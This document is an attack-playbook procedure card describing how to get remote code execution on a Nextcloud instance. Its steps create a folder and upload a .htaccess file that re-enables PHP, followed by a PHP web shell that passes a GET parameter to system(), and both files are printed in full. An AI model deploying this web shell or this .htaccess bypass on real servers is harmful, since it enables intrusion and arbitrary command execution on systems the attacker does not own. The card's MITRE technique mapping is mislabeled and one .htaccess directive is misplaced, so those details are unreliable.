---
id: proc-create-malicious-folder
tags:
  - rce
  - php-payload
  - htaccess
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
  - '[[Upload Malware]]'
updated_at: '2025-12-14T17:23:24.874Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
  - '[[Upload Malware]]'
---
# Create-Malicious-Folder-with-HTAccess-and-PHP-Payload

## Summary

This procedure involves creating a folder in the evil Nextcloud instance containing a .htaccess file that permits PHP execution and a PHP script designed for remote code execution.

## Description

The attacker uses the Nextcloud file manager to upload files into a shared folder. The .htaccess overrides Apache's default denial of PHP in data directories, while the PHP file executes arbitrary commands via GET parameters. Prerequisites include the blacklist disabled from prior procedure.

## Requirements

1. Access to evil Nextcloud file manager
2. Text editor for creating file contents
3. Knowledge of Apache directives and PHP

## Defense

Defensive measures and detection strategies:

- Enforce strict .htaccess policies and monitor for overrides
- Scan uploaded files for suspicious PHP code using AV or WAF
- Disable federated sharing or validate external shares

## Objectives

1. Prepare permissive .htaccess for bypass
2. Embed RCE payload in PHP file
3. Ensure folder is shareable

## Instructions

### Step 1: Create the Folder

**Context**: Use Nextcloud UI to create 'sharefolder/attack'.

Navigate to files section and create new folder 'sharefolder', then subfolder 'attack'.

> Expected output: Folder visible in file tree.

### Step 2: Upload .htaccess

**Context**: Create and upload .htaccess with directives to allow PHP.

Content:

```apache
AllowOverride All
<Files ~ "\.(php)$">
    SetHandler application/x-httpd-php
</Files>
php_flag engine on
```

Upload via drag-and-drop or new file.

> Expected output: File saved without blacklist block.

### Step 3: Upload attack.php

**Context**: Create PHP payload for RCE.

Content:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Upload to the attack folder.

> Expected output: PHP file in folder, testable locally if webroot allows.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Python]] PHP
- [[Upload Malware]] Dynamic Library Injection

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- rce
- php-payload
